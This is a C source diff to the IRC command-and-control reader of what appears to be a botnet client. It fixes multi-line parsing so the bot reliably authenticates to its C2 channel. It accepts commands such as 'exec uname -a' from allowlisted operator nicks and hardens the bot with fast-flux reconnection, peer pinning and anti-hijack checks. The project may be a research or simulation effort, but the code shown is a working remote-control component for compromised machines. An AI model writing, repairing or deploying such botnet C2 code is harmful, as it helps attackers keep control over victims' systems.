@@ -475,7 +475,15 @@ int irc_read(notnet_bot_t *bot, char *buf, int len) {
         if (select(bot->c2_irc.sock + 1, &fds, NULL, NULL, &tv) <= 0) return 0;
     }
     
-    int received = chan_recv(&bot->c2_irc.tls, bot->c2_irc.sock, buf, len);
+    /* Recv into a local scratch buffer, then iterate line-by-line. A server
+     * coalesces several numerics/PRIVMSGs into one TCP segment (e.g. the
+     * 001/250/376 welcome burst); parsing only the first line meant the bot
+     * never saw the 376 MOTD-complete and never authenticated. Found by the
+     * S7 remaining-parity sim (#100) — the legacy IRC mock passed the old
+     * docker test only because TCP segmentation happened to split the
+     * numerics across reads. */
+    char raw[1024];
+    int received = chan_recv(&bot->c2_irc.tls, bot->c2_irc.sock, raw, sizeof(raw) - 1);
     if (received <= 0) {
         log_info("IRC: connection closed");
         /* SECURITY FIX (#85): advance the flux IP so the reconnect
@@ -486,137 +494,154 @@ int irc_read(notnet_bot_t *bot, char *buf, int len) {
         bot->c2_irc.sock = -1;
         return -1;
     }
-    
-    /* Process IRC response */
-    if (received >= len) received = len - 1;
-    buf[received] = '\0';
-    
-    /* Check for PING - must be at start of line for IRC server PING */
-    if (strncmp(buf, "PING", 4) == 0) {
-        char host[256] = {0};
-        char *ping = strstr(buf, "PING");
-        char *colon = ping ? strchr(ping, ':') : NULL;
-        if (colon) {
-            colon++; /* skip colon */
-            /* skip leading space after colon */
-            while (*colon == ' ') colon++;
-            if (*colon) {
-                strncpy(host, colon, sizeof(host) - 1);
-                host[sizeof(host) - 1] = '\0';
+    if (received >= (int)sizeof(raw)) received = (int)sizeof(raw) - 1;
+    raw[received] = '\0';
+
+    char *line = raw;
+    while (line && *line) {
+        /* Terminate this line at the newline; strip a preceding CR so a
+         * bare-LF or CRLF server both parse. Compute the next line pointer
+         * BEFORE mutating the string (strchr after *nl='\0' cannot find the
+         * CR that sits before the LF). */
+        char *nl = strchr(line, '\n');
+        char *next = nl ? nl + 1 : NULL;
+        if (nl) *nl = '\0';
+        size_t linelen = strlen(line);
+        if (linelen > 0 && line[linelen - 1] == '\r') line[linelen - 1] = '\0';
+
+        /* Check for PING - must be at start of line for IRC server PING.
+         * Line-scoped strncmp avoids the old strstr() false match on
+         * "PING" inside PRIVMSG text (CWE-115). */
+        if (strncmp(line, "PING", 4) == 0) {
+            char host[256] = {0};
+            char *colon = strchr(line, ':');
+            if (colon) {
+                colon++; /* skip colon */
+                /* skip leading space after colon */
+                while (*colon == ' ') colon++;
+                if (*colon) {
+                    strncpy(host, colon, sizeof(host) - 1);
+                    host[sizeof(host) - 1] = '\0';
+                }
+            }
+            if (host[0]) {
+                irc_send(bot, "PONG %s", host);
+                log_debug("IRC: ponged %s", host);
+            } else {
+                irc_send(bot, "PONG");
             }
         }
-        if (host[0]) {
-            irc_send(bot, "PONG %s", host);
-            log_debug("IRC: ponged %s", host);
-        } else {
-            irc_send(bot, "PONG");
-        }
-    }
     
-    /* Check for JOIN confirmation (366 End of NAMES)
-     * SECURITY FIX (#29): Use strncmp on the IRC numeric response format
-     * instead of strstr("366"). The old check matched any occurrence of
-     * "366" anywhere in the buffer, including in PRIVMSG text, allowing
-     * any user to trigger false authentication. */
-    if (strncmp(buf, ":", 1) == 0) {
-        char *space = strchr(buf + 1, ' ');
-        if (space) {
-            char *code = space + 1;
-            /* Format: :server 366 client #chan :End of NAMES list */
-            if (strncmp(code, "366", 3) == 0 && (code[3] == ' ' || code[3] == '\0')) {
-                log_info("IRC: joined channel %s", bot->c2_irc.channel);
-                bot->c2_irc.authenticated = 1;
-                /* SECURITY FIX (#10): Pin the connected peer IP on first auth.
-                 * SECURITY FIX (#85): skipped in flux mode — the peer IP rotates. */
-                if (!bot->flux_enabled && !bot->c2_irc.dns_pinned) {
-                    struct sockaddr_in sin;
-                    socklen_t slen = sizeof(sin);
-                    getpeername(bot->c2_irc.sock, (struct sockaddr *)&sin, &slen);
-                    bot->c2_irc.pinned_addr = sin.sin_addr;
-                    bot->c2_irc.dns_pinned = 1;
-                    log_info("IRC: DNS pin set to %s", inet_ntoa(sin.sin_addr));
+        /* Check for JOIN confirmation (366 End of NAMES)
+         * SECURITY FIX (#29): Use strncmp on the IRC numeric response format
+         * instead of strstr("366"). The old check matched any occurrence of
+         * "366" anywhere in the buffer, including in PRIVMSG text, allowing
+         * any user to trigger false authentication. */
+        if (strncmp(line, ":", 1) == 0) {
+            char *space = strchr(line + 1, ' ');
+            if (space) {
+                char *code = space + 1;
+                /* Format: :server 366 client #chan :End of NAMES list */
+                if (strncmp(code, "366", 3) == 0 && (code[3] == ' ' || code[3] == '\0')) {
+                    log_info("IRC: joined channel %s", bot->c2_irc.channel);
+                    bot->c2_irc.authenticated = 1;
+                    /* SECURITY FIX (#10): Pin the connected peer IP on first auth.
+                     * SECURITY FIX (#85): skipped in flux mode — the peer IP rotates. */
+                    if (!bot->flux_enabled && !bot->c2_irc.dns_pinned) {
+                        struct sockaddr_in sin;
+                        socklen_t slen = sizeof(sin);
+                        getpeername(bot->c2_irc.sock, (struct sockaddr *)&sin, &slen);
+                        bot->c2_irc.pinned_addr = sin.sin_addr;
+                        bot->c2_irc.dns_pinned = 1;
+                        log_info("IRC: DNS pin set to %s", inet_ntoa(sin.sin_addr));
+                    }
                 }
             }
         }
-    }
 
-    /* Check for MOTD complete (376 End of MOTD) - sets authenticated for non-channels mode
-     * SECURITY FIX (#29): Same strstr("376") false-match issue as above. */
-    if (strncmp(buf, ":", 1) == 0) {
-        char *space = strchr(buf + 1, ' ');
-        if (space) {
-            char *code = space + 1;
-            if (strncmp(code, "376", 3) == 0 && (code[3] == ' ' || code[3] == '\0')) {
-                log_info("IRC: MOTD complete, authenticated");
-                bot->c2_irc.authenticated = 1;
-                /* SECURITY FIX (#10): Pin the connected peer IP on first auth.
-                 * SECURITY FIX (#85): skipped in flux mode — the peer IP rotates. */
-                if (!bot->flux_enabled && !bot->c2_irc.dns_pinned) {
-                    struct sockaddr_in sin;
-                    socklen_t slen = sizeof(sin);
-                    getpeername(bot->c2_irc.sock, (struct sockaddr *)&sin, &slen);
-                    bot->c2_irc.pinned_addr = sin.sin_addr;
-                    bot->c2_irc.dns_pinned = 1;
-                    log_info("IRC: DNS pin set to %s", inet_ntoa(sin.sin_addr));
+        /* Check for MOTD complete (376 End of MOTD) - sets authenticated for non-channels mode
+         * SECURITY FIX (#29): Same strstr("376") false-match issue as above. */
+        if (strncmp(line, ":", 1) == 0) {
+            char *space = strchr(line + 1, ' ');
+            if (space) {
+                char *code = space + 1;
+                if (strncmp(code, "376", 3) == 0 && (code[3] == ' ' || code[3] == '\0')) {
+                    log_info("IRC: MOTD complete, authenticated");
+                    bot->c2_irc.authenticated = 1;
+                    /* SECURITY FIX (#10): Pin the connected peer IP on first auth.
+                     * SECURITY FIX (#85): skipped in flux mode — the peer IP rotates. */
+                    if (!bot->flux_enabled && !bot->c2_irc.dns_pinned) {
+                        struct sockaddr_in sin;
+                        socklen_t slen = sizeof(sin);
+                        getpeername(bot->c2_irc.sock, (struct sockaddr *)&sin, &slen);
+                        bot->c2_irc.pinned_addr = sin.sin_addr;
+                        bot->c2_irc.dns_pinned = 1;
+                        log_info("IRC: DNS pin set to %s", inet_ntoa(sin.sin_addr));
+                    }
                 }
             }
         }
-    }
 
-    /* Process PRIVMSG commands */
-    char *privmsg = strstr(buf, "PRIVMSG");
-    if (privmsg) {
-        /* SECURITY FIX (#5): Verify sender nick against allowlist.
-         * IRC PRIVMSG format: :sender_nick!user@host PRIVMSG target :message
-         * The nick is the text between the leading ':' and the first '!'. */
-        char sender_nick[32] = {0};
-        char *colon = buf;  /* buf starts with :nick!user@host ... */
-        if (*colon == ':') {
-            colon++; /* skip leading colon */
-            char *bang = strchr(colon, '!');
-            if (bang) {
-                int nick_len = bang - colon;
-                if (nick_len > 31) nick_len = 31;
-                memcpy(sender_nick, colon, nick_len);
-                sender_nick[nick_len] = '\0';
+        /* Process PRIVMSG commands */
+        char *privmsg = strstr(line, "PRIVMSG");
+        if (privmsg) {
+            /* SECURITY FIX (#5): Verify sender nick against allowlist.
+             * IRC PRIVMSG format: :sender_nick!user@host PRIVMSG target :message
+             * The nick is the text between the leading ':' and the first '!'. */
+            char sender_nick[32] = {0};
+            char *colon = line;  /* line starts with :nick!user@host ... */
+            if (*colon == ':') {
+                colon++; /* skip leading colon */
+                char *bang = strchr(colon, '!');
+                if (bang) {
+                    int nick_len = bang - colon;
+                    if (nick_len > 31) nick_len = 31;
+                    memcpy(sender_nick, colon, nick_len);
+                    sender_nick[nick_len] = '\0';
+                }
+            }
+
+            /* Check sender against authorized nicks */
+            int authorized = 0;
+            for (int i = 0; i < bot->c2_irc.auth_nick_count && i < 8; i++) {
+                if (strcmp(sender_nick, bot->c2_irc.auth_nicks[i]) == 0) {
+                    authorized = 1;
+                    break;
+                }
+            }
+            /* SECURITY FIX (#11): Constant-time auth check. Instead of
+             * returning immediately for unauthorized senders (timing oracle),
+             * add a random delay to mask the early return path. */
+            if (!authorized) {
+                /* Random delay 10-50ms to mask timing differences */
+                usleep(10000 + (rand() % 40000));
+                log_warn("IRC: PRIVMSG from unauthorized nick '%s' ignored", sender_nick);
+                /* Keep scanning the remaining lines — an unauthorized line
+                 * must not suppress a later valid command in the same recv. */
+                line = next;
+                continue;
+            }
+
+            /* Find the message part after the channel name */
+            colon = strchr(privmsg, ':');
+            if (colon) {
+                colon++; /* skip the colon, point to message text */
+                /* Trim trailing \r\n */
+                int msg_len = strlen(colon);
+                while (msg_len > 0 && (colon[msg_len - 1] == '\r' || colon[msg_len - 1] == '\n' || colon[msg_len - 1] == ' ')) {
+                    colon[--msg_len] = '\0';
+                }
+                /* Copy full message text as the command (e.g. "exec uname -a") */
+                int cmd_len = msg_len;
+                if (cmd_len > len - 1) cmd_len = len - 1;
+                memmove(buf, colon, cmd_len);
+                buf[cmd_len] = '\0';
+                log_info("IRC: command: %s", buf);
+                return 1; /* signal new command */
             }
         }
 
-        /* Check sender against authorized nicks */
-        int authorized = 0;
-        for (int i = 0; i < bot->c2_irc.auth_nick_count && i < 8; i++) {
-            if (strcmp(sender_nick, bot->c2_irc.auth_nicks[i]) == 0) {
-                authorized = 1;
-                break;
-            }
-        }
-        /* SECURITY FIX (#11): Constant-time auth check. Instead of
-         * returning immediately for unauthorized senders (timing oracle),
-         * add a random delay to mask the early return path. */
-        if (!authorized) {
-            /* Random delay 10-50ms to mask timing differences */
-            usleep(10000 + (rand() % 40000));
-            log_warn("IRC: PRIVMSG from unauthorized nick '%s' ignored", sender_nick);
-            return 0;
-        }
-
-        /* Find the message part after the channel name */
-        colon = strchr(privmsg, ':');
-        if (colon) {
-            colon++; /* skip the colon, point to message text */
-            /* Trim trailing \r\n */
-            int msg_len = strlen(colon);
-            while (msg_len > 0 && (colon[msg_len - 1] == '\r' || colon[msg_len - 1] == '\n' || colon[msg_len - 1] == ' ')) {
-                colon[--msg_len] = '\0';
-            }
-            /* Copy full message text as the command (e.g. "exec uname -a") */
-            int cmd_len = msg_len;
-            if (cmd_len > len - 1) cmd_len = len - 1;
-            memmove(buf, colon, cmd_len);
-            buf[cmd_len] = '\0';
-            log_info("IRC: command: %s", buf);
-            return 1; /* signal new command */
-        }
+        line = next;
     }
     
     return 0;
